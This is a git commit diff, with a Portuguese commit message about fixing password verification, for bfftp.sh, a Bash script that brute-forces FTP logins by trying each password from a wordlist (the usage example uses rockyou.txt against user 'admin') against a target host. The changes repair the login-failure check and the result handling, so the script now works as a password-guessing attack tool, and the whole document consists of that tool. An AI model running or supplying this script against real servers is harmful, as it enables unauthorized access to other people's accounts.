531dd61d5b8816569a803c56eec2522b7803f908
root <root@localhost.localdomain>
2017-07-30 04:42:11 -0300

    corrigido bug da verificação de senha

--- bfftp.sh
+++ bfftp.sh
@@ -10,11 +10,11 @@
 
 function_usage() {
 	cat << EOF
-	Simple script to brute force in protocol ftp \\
-	Usage: $0 -t <host|ip> -w <wordlist> -u <user> \\
+	Simple script to brute force in protocol ftp
+	Usage: $0 -t <host|ip> -w <wordlist> -u <user>
 	Example: $0 -t 192.168.0.1 -w /home/user/rockyou.txt -u admin
 EOF
-	
+
 exit 1;
 }
 
@@ -23,13 +23,13 @@ function_bfftp() {
 	testpass=$(ftp -n "$1" << _CONECTION
 	quote USER $2
 	quote PASS $3
-	quit 	
+	quit
 _CONECTION
 
 )
 
 
-if test "$testpass" -eq "Login Incorrect."; then
+if test "$testpass" = "Login incorrect."; then
 	return 1
 else
 	return 0
@@ -45,24 +45,25 @@ while getopts t:w:u: opt; do
 		"u") user="${OPTARG}" ;;
 		"*") function_usage ;;
 	esac
-done 
+done
 
 
 [ $host ] || function_usage;
 [ $wordlist ] || function_usage;
 [ $user ] || function_usage;
 
-echo "Target: $host"\n User: $user\n Wordlist: `wc -l $wordlist | awk '{print $1}'`
+echo -e "\n[  TARGET  ]: $host \n[   USER   ]: $user \n[ WORDLIST ]: `wc -l $wordlist | awk '{print $1}'` \n"
+
 
 for password in $(cat $wordlist); do
-	echo "Testando password: $password"
+	echo -e "[  TEST  ] Testing the password: $password"
 	test=$(function_bfftp $host $user $password)
-	result=$(echo $?)	
-	
-	if test $result -eq 0; then
-		echo "Password incorrect!"
+	result=$(echo $?)
+
+	if test $result -eq 1; then
+		echo -e "[ FAILED ] Password incorrect! \n"
 	else
-		echo "Password correct: $password"
+		echo -e "[   OK   ] Password correct: $password"
 		break
 	fi
 done
